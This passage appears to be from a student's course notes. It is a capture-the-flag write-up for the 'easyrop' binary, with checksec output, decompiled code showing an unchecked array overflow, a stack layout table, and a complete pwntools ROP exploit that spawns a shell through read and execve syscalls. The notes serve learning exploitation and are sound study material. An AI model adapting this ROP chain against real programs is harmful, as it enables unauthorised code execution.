+<pre class="language-bash"><code v-pre class="language-bash">$ file easyrop
+easyrop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=b944b910db4096bc5126a7f2d9285d2a06636a0b, not stripped</code></pre>
+</doc-codeblock></div>
+<p>64 bit statically linked binary: the calling convention needs us to use register to setup a call to <code v-pre>execve</code> to spawn a shell. This is the only way since the stack is NX:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">$ checksec --file ./easyrop
+RELRO           STACK CANARY      NX            PIE         
+No RELRO        No canary found   NX enabled    No PIE       </code></pre>
+</doc-codeblock></div>
+<p>And <code v-pre>system</code> is not present in the binary. We can perform buffer overflow by filling the stack exploiting the <code v-pre>while</code> loop in the <code v-pre>main</code> function. Ghidra disassembled code:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">undefined8 main(void)
+
+{
+  ssize_t bytes_read;
+  int var2;
+  int var1;
+  int array [12];
+
+  len = 0xc3585a5e5f;
+  write(1,&quot;Try easyROP!\n&quot;,0xd);
+  while (2 &lt; len) {
+    len = 0;
+    bytes_read = read(0,&amp;var1,4);
+    len = len + (int)bytes_read;
+    bytes_read = read(0,&amp;var2,4);
+    len = len + (int)bytes_read;
+    array[index] = var2 + var1;
+    index = index + 1;
+    write(1,&amp;len,4);
+  }
+  return 0;
+}</code></pre>
+</doc-codeblock></div>
+<p>Basically we can fill up 8 bytes (1 cell) of the buffer in each loop iteration, since no array bound check is performed. Between the beginning of the array and seip there are 56 bytes.</p>
+<doc-anchor-target id="the-actual-exploit">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#the-actual-exploit">#</doc-anchor-trigger>
+        <span>The actual exploit</span>
+    </h3>
+</doc-anchor-target>
+<p>This will be the structure of our exploit:</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>BEFORE VULNERABLE READ</th>
+<th>AFTER VULNERABLE READ</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>array[...]</td>
+<td>padding</td>
+</tr>
+<tr>
+<td>...</td>
+<td>...</td>
+</tr>
+<tr>
+<td>* array[...] + 48</td>
+<td>padding</td>
+</tr>
+<tr>
+<td>sebp</td>
+<td>junk</td>
+</tr>
+<tr>
+<td>seip</td>
+<td>g1 address</td>
+</tr>
+<tr>
+<td>...</td>
+<td>0 (stdin)</td>
+</tr>
+<tr>
+<td>...</td>
+<td>global variable address (/bin/sh location)</td>
+</tr>
+<tr>
+<td>...</td>
+<td>8 (#bytes to read)</td>
+</tr>
+<tr>
+<td>...</td>
+<td>0 (read syscall code)</td>
+</tr>
+<tr>
+<td>...</td>
+<td>g2 address</td>
+</tr>
+<tr>
+<td>...</td>
+<td>junk</td>
+</tr>
+<tr>
+<td>...</td>
+<td>g1 address</td>
+</tr>
+<tr>
+<td>...</td>
+<td>global variable address (/bin/sh location)</td>
+</tr>
+<tr>
+<td>...</td>
+<td>pointer to zero (rsi content)</td>
+</tr>
+<tr>
+<td>...</td>
+<td>pointer to zero (rdx content)</td>
+</tr>
+<tr>
+<td>...</td>
+<td>0x3b (execve syscall code)</td>
+</tr>
+<tr>
+<td>...</td>
+<td>g3 address</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>Basically we want to perform a read to put &#x27;/bin/sh&#x27; in memory, and pass it as argument to the execve syscall in order to be able to spawn a shell.</p>
+<p>Note that:</p>
+<ul>
+<li><p>g1 is a gadget that performs the following operations:</p>
+<p><code v-pre>pop rdi, pop rsi, pop rdx, pop rax, ret</code></p>
+</li>
+<li><p>g2:</p>
+<p><code v-pre>syscall, nop, nop, pop rbp, ret </code></p>
+<p>We need a syscall gadget that also performs a ret in order to be able to execute another syscall (execve /bin/sh) after the read.</p>
+</li>
+<li><p>g3: <code v-pre>syscall</code></p>
+</li>
+</ul>
+<p>The newline character of <code v-pre>/bin/sh\x00</code> makes the syscall fail (it will return -1 in <code v-pre>rax</code>). Solution: pass the string with <code v-pre>pwntools</code>. Actual exploit:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">#!/usr/bin/python3
+from pwn import *
+from time import sleep
+
+# global variables
+binary = './easyrop'
+port = 2015
+debug = False
+remote_enabled = False
+delay = 0.05
+
+# initializing address variables
+# note that the binary is statically linked
+e = ELF(binary)
+index = e.symbols['index']
+binsh_addr = index+8
+zeros_addr = binsh_addr+8
+
+rop = ROP(e)
+magic_gadget = rop.find_gadget(['pop rdi','pop rsi','pop rdx','pop rax','ret'])
+syscall = rop.find_gadget(['syscall'])
+syscall_ret = rop.find_gadget(['syscall','nop','pop','rbp','ret'])
+ret = rop.find_gadget(['ret'])
+
+# checking that everything is all right
+print('____________________________________')
+print('address of all in one gadget: {} - {}'.format(hex(magic_gadget[0]), p64(int(magic_gadget[0]))))
+print('address of syscall: {} - {}'.format(hex(syscall[0]), p64(int(magic_gadget[0]))))
+print('address of /bin/sh: {}'.format(hex(binsh_addr)))
+print('address of zeros: {}'.format(hex(zeros_addr)))
+print('____________________________________')
+
+# trying to minimize replicated code
+def sender(payload):
+    r.send(payload)
+    r.send('\x00'*4)
+    print('\n sent: {}'.format(str(payload)))
+    print('read {} bytes'.format(str(r.recv())))
+    sleep(delay)
+
+# setting up execution environment
+context.update(arch='amd64', os='linux')
+if debug:
+    context.log_level = 'DEBUG'
+context.terminal = ['tmux', 'splitw', '-h']
+if remote_enabled:
+    r = remote(&quot;training.jinblack.it&quot;, port)
+else:
+    r = process(binary)
+    gdb.attach(r, '''
+        b main
+        continue
+        b * 0x400290
+    ''')
+
+r.recvuntil('Try easyROP!')
+
+# SENDING THE ACTUAL EXPLOIT
+
+# padding to get to sebp
+for i in range(12):
+    sender(b'AAAA')
+
+# junking sebp
+sender(b'BBBB')
+sender(b'BBBB')
+
+# reading '/bin/sh' into the .bss section to allow the call to execve
+
+# address of pop gadget
+sender(p64(magic_gadget[0]))
+sender(b'\x00'*4)
+
+# fd from which we take the input
+sender(b'\x00'*4)
+sender(b'\x00'*4)
+
+# where to read
+sender(p64(binsh_addr))
+
+# how much to read
+sender(p64(8))
+
+# syscall code
+sender(b'\x00'*4)
+sender(b'\x00'*4)
+
+# sycall + ret gadget
+sender(b'\x00'*4)
+sender(p64(0x00000000004001b3))
+
+# junking next stack cell
+sender(b'BBBB')
+sender(b'BBBB')
+
+# setting up the stack to spawn the shell
+
+# address of pop gadget
+sender(p64(magic_gadget[0]))
+sender(b'\x00'*4)
+
+# address of /bin/sh
+sender(p64(binsh_addr))
+
+# pointer to zero
+sender(p64(zeros_addr))
+sender(b'\x00'*4)
+
+# pointer to zero
+sender(p64(zeros_addr))
+
+# # syscall code
+sender(b'\x3b')
+sender(b'\x00'*4)
+
+# syscall gadget address
+sender(p64(syscall[0]))
+sender(b'\x00'*4)
+
+# breaking the loop
+input('[#1] press any key to break the loop...')
+r.send(b'A')
+sleep(delay)
+input('[#2] press any key to break the loop...')
+r.send(b'A')
+sleep(delay)
+input('[#3] press any key to break the loop...')
+r.send(b'A')
+sleep(delay)
+
+input('press any key to send /bin/sh')
+r.send(b'/bin/sh\x00')
+sleep(delay)
+
+# hopefully getting a shell
+r.interactive()</code></pre>
+</doc-codeblock></div>
+
+                                
+                                <!-- Required only on API pages -->
+                                <doc-toolbar-member-filter-no-results />
+                            </div>
+                            <footer class="clear-both">
+                            
+                                <nav class="flex mt-14">
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../03-reversing/">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                            <span>
+                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
+                                                <span class="block mt-1">Reversing</span>
+                                            </span>
+                                        </a>
+                                    </div>
+                            
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../06-serialization/">
+                                            <span>
+                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
+                                                <span class="block mt-1">Serialization</span>
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                        </a>
+                                    </div>
+                                </nav>
+                            </footer>
+                        </main>
+                
+                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
+                            <footer class="flex flex-wrap items-center justify-between">
+                                <div>
+                                    <ul class="flex flex-wrap items-center text-sm">
+                                    </ul>
+                                </div>
+                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>Check out my GitHub profile for other notes: <a href="https://github.com/francesco-plt">https://github.com/francesco-plt</a></p></div>
+                            </footer>
+                        </div>
+                    </div>
+                
+                    <!-- Rendered if sidebar right is enabled -->
+                    <!-- Sidebar right skeleton-->
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
+                        <div class="pl-5">
+                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                        </div>
+                    </div>
+                
+                    <!-- User should be able to hide sidebar right -->
+                    <doc-sidebar-right v-cloak></doc-sidebar-right>
+                </div>
+
+            </div>
+        </div>
+    
+        <doc-search-mobile></doc-search-mobile>
+        <doc-back-to-top></doc-back-to-top>
+    </div>
+
+
+    <div id="docs-overlay-target"></div>
+
+    <script>window.__DOCS__ = { "title": "ROP", level: 1, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false }</script>
+</body>
+</html>
